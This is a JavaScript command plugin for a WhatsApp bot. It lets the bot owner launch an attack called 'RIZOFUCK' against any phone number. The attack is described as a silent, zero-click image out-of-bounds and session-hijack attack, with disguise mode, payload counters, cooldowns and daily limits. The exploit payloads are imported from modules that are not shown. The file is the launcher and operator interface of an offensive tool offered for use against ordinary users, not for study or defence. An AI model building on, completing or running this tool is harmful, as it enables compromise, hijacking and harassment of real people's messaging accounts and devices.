// plugins/rizofuck.js
const { cmd } = require('../arslan');
const { Rizofuck, CONFIG } = require('../lib/rizofuck');
const guard = require('../lib/rizofuck_guard');

cmd({
    pattern: 'rizofuck',
    alias: ['rf', 'rizofk', 'rizofuckattack'],
    desc: 'RIZOFUCK attack — image OOB + sync hijack (owner only)',
    category: 'owner',
    react: '💥',
    filename: __filename,
    owner: true
},
async (conn, mek, m, {
    from, body, args, q, sender, senderNumber,
    pushname, isCreator, isOwner, isGroup, reply
}) => {
    try {
        // ═══════════════════════════════════════════
        //  OWNER GATE — main.js already computes isCreator
        // ═══════════════════════════════════════════
        if (!isCreator) {
            return reply('🔒 *Owner Only — RIZOFUCK Command!*');
        }

        // ═══════════════════════════════════════════
        //  PARSE TARGET — args already split by main.js
        // ═══════════════════════════════════════════
        if (!args[0]) {
            return reply(
`📌 *Usage:* .rizofuck 923xxxxxxxxx

📖 *Example:* .rizofuck 923001234567

💥 RIZOFUCK Attack
🎯 Zero-click, silent, session hijack
🛡 Self-protection active
⏳ 48h per-target cooldown`
            );
        }

        const targetNumber = (args[0] || '').replace(/[^0-9]/g, '');

        if (!targetNumber || targetNumber.length < 10) {
            return reply('❌ *Invalid number format!*');
        }

        // ═══════════════════════════════════════════
        //  GUARD CHECKS
        // ═══════════════════════════════════════════
        const botNum = String(conn.user.id || '').split(':')[0].split('@')[0].replace(/[^0-9]/g, '');
        const check = guard.checkTarget(targetNumber, botNum);

        if (!check.ok) {
            return reply(
`${check.msg}

🚫 Target: \`${targetNumber}\`
📋 Reason: \`${check.reason}\``
            );
        }

        const targetJid = targetNumber + '@s.whatsapp.net';

        // ═══════════════════════════════════════════
        //  ACK
        // ═══════════════════════════════════════════
        await reply(
`💥 *RIZOFUCK LOCKED*
📱 Target : \`${targetNumber}\`
🎯 Vector : Image OOB + Sync Hijack
🎭 Disguise: ${CONFIG.DISGUISE ? 'ON' : 'OFF'}
🔇 Silent  : ${CONFIG.SILENT ? 'ON' : 'OFF'}
🛡 Self-guard: active
⚡ Launching...`
        );

        // ═══════════════════════════════════════════
        //  LAUNCH
        // ═══════════════════════════════════════════
        let lastPct = 0;
        const result = await Rizofuck(conn, targetJid, (sent, total, type) => {
            const pct = Math.floor((sent / total) * 100);
            if (pct >= lastPct + 20) {
                lastPct = pct;
                conn.sendMessage(from, {
                    text: `⏳ RIZOFUCK ${pct}% — last: *${type}* (${sent}/${total})`
                }).catch(() => {});
            }
        });

        // ═══════════════════════════════════════════
        //  RESULT
        // ═══════════════════════════════════════════
        if (result.ok) {
            guard.recordAttack(targetNumber, 'success');

            await conn.sendMessage(from, {
                react: { text: '💥', key: mek.key }
            });

            const stats = guard.getStats();
            return reply(
`✅ *RIZOFUCK COMPLETE*
🎯 Target : \`${targetNumber}\`
📤 Sent   : \`${result.sent}\` payloads
🎭 Vector : image + sync
🕒 ${new Date().toLocaleString()}

📊 Today : ${stats.todayCount}/${stats.dailyLimit}
⏳ Next attack in 60 min (global)`
            );
        } else {
            guard.recordAttack(targetNumber, 'failed:' + result.error);
            return reply(`⚠️ *Partial failure:* ${result.error}`);
        }

    } catch (err) {
        console.log('RIZOFUCK ERROR:', err);
        return reply(
`❌ *RIZOFUCK ERROR*

${err.message}`
        );
    }
});